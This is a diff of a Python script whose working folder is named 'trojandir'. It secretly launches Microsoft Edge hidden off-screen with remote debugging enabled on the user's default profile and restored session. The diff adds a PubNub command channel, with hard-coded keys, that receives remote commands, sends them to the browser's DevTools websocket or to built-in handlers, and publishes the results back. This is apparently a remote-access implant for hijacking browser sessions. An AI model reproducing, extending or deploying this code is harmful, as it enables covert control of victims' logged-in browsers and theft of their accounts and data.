@@ -1,3 +1,5 @@
+# 20260607-1336
+
 # https://onecompiler.com/python/44me4y8rn
 
 # clear ; & "E:\__Binaries\Portable Python-3.10.5 x64\App\Python\python.exe" test.py
@@ -7,8 +9,17 @@
 # use 9223 for chrome, 9222 for msedge
 
 # python -m pip install psutil
+# python -m pip install pubnub
 
 # curl -s http://localhost:9222/json/list | findstr webSocketDebuggerUrl | findstr ws://
+
+from datetime import datetime
+import time
+from pubnub.pubnub import PubNub
+from pubnub.pnconfiguration import PNConfiguration
+from pubnub.pubnub import PubNub
+from pubnub.callbacks import SubscribeCallback
+from pubnub.enums import PNStatusCategory
 
 import traceback
 import psutil
@@ -47,7 +58,7 @@ def logexception(exp):
     if ( not exp ):
         return
         
-    expstrdict = getexceptionobj()
+    expstrdict = getexceptionobj(exp)
 
     logmsg(json.dumps(expstrdict))
 
@@ -175,19 +186,20 @@ def clientgetnextmessage():
     return obj_dict
 
 def clientpushmessage(payload, messageid):
-    
+    logmsg("starting "+inspect.currentframe().f_code.co_name)
+
     if not payload:
         return None
     
-    msgstr = json.dumps(payload)
+    #msgstr = json.dumps(payload)
 
-    url = f"{mothership}/ow/relay.php?"
-    url += f"action=clientpushmessage"
-    url += f"&clientid={clientid}&sessionid={relaysessionid}&messageid={messageid}"
+    #url = f"{mothership}/ow/relay.php?"
+    #url += f"action=clientpushmessage"
+    #url += f"&clientid={clientid}&sessionid={relaysessionid}&messageid={messageid}"
     
-    response = requests.post(url, data=msgstr.encode('utf-8'), headers={'Content-Type': 'application/json'})
-
-    return response
+    #response = requests.post(url, data=msgstr.encode('utf-8'), headers={'Content-Type': 'application/json'})
+    return publish_msg(payload, messageid)
+    #return response
 
 def wait_clientgetnextmessage(secs=1):
     result = None
@@ -199,7 +211,7 @@ def wait_clientgetnextmessage(secs=1):
 
             if ( msg_str== "TRY_AGAIN" ):
                 result = None
-                logmsg(inspect.currentframe().f_code.co_name + " sleeping")
+                logmsg(inspect.currentframe().f_code.co_name + " sleeping for " + str(secs) + " seconds")
                 time.sleep(secs)
         else:
             break
@@ -230,22 +242,36 @@ def exec_builtin(tcmdname):
 
     return json.dumps(result)
 
-def client_loop():
-    logmsg("starting "+inspect.currentframe().f_code.co_name)
+def client_loop(message):
+    logmsg("client_loop: starting "+inspect.currentframe().f_code.co_name)
 
-    message_obj = wait_clientgetnextmessage()
+    message_obj = message
     messageid = message_obj["MessageID"]
-    payload =   message_obj["JSON"]
+    payload =   message_obj["payload"]
     
     builtincmd = ""
     
     if ( "builtincmd" in message_obj ):
         builtincmd = message_obj["builtincmd"]
+
+        logmsg(f"client_loop: processing builtincmd {builtincmd}")
+        
         if ( not isempty(builtincmd) ):
             result = exec_builtin(builtincmd)
+            
     else:
-        ws_url = payload["ws_url"]
-        payload = payload["payload"]
+    
+        if not "ws_url" in message_obj:
+            logmsg("ws_url not in message_obj")
+            return
+
+        if not "payload" in message_obj:
+            logmsg("payload key not in message_obj")
+            return
+            
+        ws_url = message_obj["ws_url"]
+        
+        payload = message_obj["payload"]
 
         logmsg(f"ws_url: {ws_url}")
         logmsg(f"payload: {payload}")
@@ -267,19 +293,34 @@ def client_loop():
             
         result = clientpushmessage(result, messageid)
 
-def get_relay_ws_url():
+def get_relay_ws_url(debugport=9222):
+    pp = inspect.currentframe().f_code.co_name
+    
+    logmsg(f"{pp}: debugport: {debugport}")
+
     try:
-        response = requests.get("http://localhost:9222/json/version")
+        url="http://localhost:"+str(debugport)+"/json/version"
+        logmsg(f"{pp}: HTTP GET {url}" )
+        response = requests.get(url)
         
-        if ( response ):
-            logmsg("response.status_code: " + str(response.status_code))  # e.g., 200 for success
-            data_dict = response.json()
+        if ( not response ):
+            raise Exception("response is null")
+            
+        logmsg("response.status_code: " + str(response.status_code))  # e.g., 200 for success
+        
+        data_dict = response.json()
+        
+        trelay_ws_url = ""
+        
+        if isinstance(data_dict, dict) and "webSocketDebuggerUrl" in data_dict:
             trelay_ws_url = data_dict["webSocketDebuggerUrl"]
-            logmsg(f"relay_ws_url: {trelay_ws_url}")
         else:
-            return None
+            raise Exception("ERROR: was not able to access webSocketDebuggerUrl in result")
+                
+        logmsg(f"relay_ws_url: {trelay_ws_url}")
             
         return trelay_ws_url
+        
     except Exception as exp:
         logexception(exp)
         return None
@@ -289,11 +330,22 @@ def get_targets_list(port=9222):
     targets_list = response.json()
     return targets_list
 
-def start_msedge():
-    cmdlineargs = '--new-window "https://www.google.com/" --profile-directory=Default --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session --window-position=1000,1000 --window-size=50,50'
+def start_chrome():
+    pass
+    
+def start_msedge(starturl="https://www.google.com/", edgeport=9222):
+    cmdlineargs = '--new-window '+starturl+' --profile-directory=Default --remote-debugging-port='+str(edgeport)+' --remote-allow-origins=* --restore-last-session --window-position=2000,2000 --window-size=10,10'
     os.system("start /min msedge " + cmdlineargs)
 
 ### 
+
+delaytime = 3
+
+debugport = 9222
+if ( len(sys.argv) >= 2 ):
+    debugport = sys.argv[1]
+    if ( not isempty(debugport) ):
+        debugport = int(debugport)
 
 timestamp = gettimestamp()
 script_full_path = Path(__file__).resolve()
@@ -301,14 +353,14 @@ script_fname = Path(__file__).name
 source = script_fname
 scriptdir_full_path = script_full_path.parent
 
-temp_dir = tempfile.gettempdir()
-trojandir = os.path.join(temp_dir, "owd") 
+# temp_dir = "C:\\ProgramData\\owdtpl" # tempfile.gettempdir()
+trojandir = "C:\\ProgramData\\owdtpl" # temp_dir # os.path.join(temp_dir, "owd") 
 
-logfname=script_fname + "_" + timestamp + ".log"
+logfname = script_fname + "_" + timestamp + ".log"
 logfpath = os.path.join(scriptdir_full_path, logfname)
 logf = open(logfpath, 'w', encoding='utf-8')
 
-sessionid = random.randint(10000000, 99999999)
+sessionid = str(random.randint(10000000, 99999999))
 batchid = sessionid
 clientid = get_clientid()
 
@@ -330,7 +382,9 @@ if ( isempty(relaysessionid) ):
     logmsg("could not set relaysessionid -- exiting")
     sys.exit(1)
 
-relay_ws_url=get_relay_ws_url()
+logmsg(f"starting script {script_fname} clientid {clientid} relaysessionid {relaysessionid} sessionid {sessionid} batchid {batchid} debugport {debugport} -- args: " + ' '.join(sys.argv[1:]) + f" -- {timestamp}")
+
+relay_ws_url=get_relay_ws_url(debugport)
 
 if ( isempty(relay_ws_url) ):
     logmsg("could not set relay_ws_url -- exiting")
@@ -338,18 +392,82 @@ if ( isempty(relay_ws_url) ):
 
 ###
 
-logmsg(f"starting script {script_fname} client {clientid}  sessionid {sessionid} batchid {batchid} -- {timestamp}")
+config = PNConfiguration()
+config.publish_key = "pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc"
+config.subscribe_key = "sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd"
+config.uuid = f"clientid_{clientid}"
+
+pubnub = PubNub(config)
+target_channel = f"clientid_{clientid}_sessionid_{relaysessionid}_host"
+receive_channel = f"clientid_{clientid}_sessionid_{relaysessionid}_client"
+
+subscription = pubnub.channel(receive_channel).subscription()
+
+logmsg(f"pubnub: target_channel: {target_channel} receive_channel: {receive_channel}")
+
+def publish_callback(result, status):
+    if not status.is_error():
+        logmsg(f"pubnub: Message published with timetoken: {result.timetoken}")
+    else:
+        logmsg(f"pubnub: Publish failed with status: {status.category}")
+
+def publish_msg(msgdict, messageid):
+
+    if not msgdict:
+        return
+    
+    msgobjout = {}
+    msgobjout["payload"] = msgdict
+    msgobjout["MessageID"] = messageid
+
+    logmsg(f"pubnub: publishing message on {target_channel} -- messageid {messageid} msgdict {msgdict}")
+    result = pubnub.publish().channel(target_channel).message(msgobjout).pn_async(publish_callback)
+    return result
+
+# pubnub.publish().channel(target_channel).message(my_message).pn_async(publish_callback)
+
+def handle_message(message_event):
+    pp = inspect.currentframe().f_code.co_name
+
+    if not message_event:
+        return;
+
+    logmsg(f"pubnub: {pp} received message_event on channel [{message_event.channel}]: {message_event.message}")
+
+    return client_loop(message_event.message)
+    
+    my_message = {
+        "event": "sensor_update",
+        "device_id": "sensor_01",
+        "temperature": 22.5,
+        "status": "active",
+        "ts": datetime.now().strftime('%Y%m%d%H%M%S%f')[:-3]
+    }
+
+    logmsg("publishing response")
+
+    pubnub.publish().channel(target_channel).message(my_message).pn_async(publish_callback)
+    
+    time.sleep(3)
+
+subscription.on_message = handle_message
+
+subscription.subscribe()
+
+logmsg(f"pubnub: Successfully connected. Listening for events on: {receive_channel}, sending messages on {target_channel}")
+
+###
 
 if __name__ == "__main__":
     while True:
         try:
             logmsg("starting relay loop " + gettimestamp())
             
-            client_loop()
-
-            logmsg("relay loop sleeping " + gettimestamp())
-            
             time.sleep(1)  
+
+            logmsg(f"relay loop sleeping for {delaytime} seconds -- " + gettimestamp())
+            
+            time.sleep(delaytime)  
 
         except Exception as exp:
             logexception(exp)
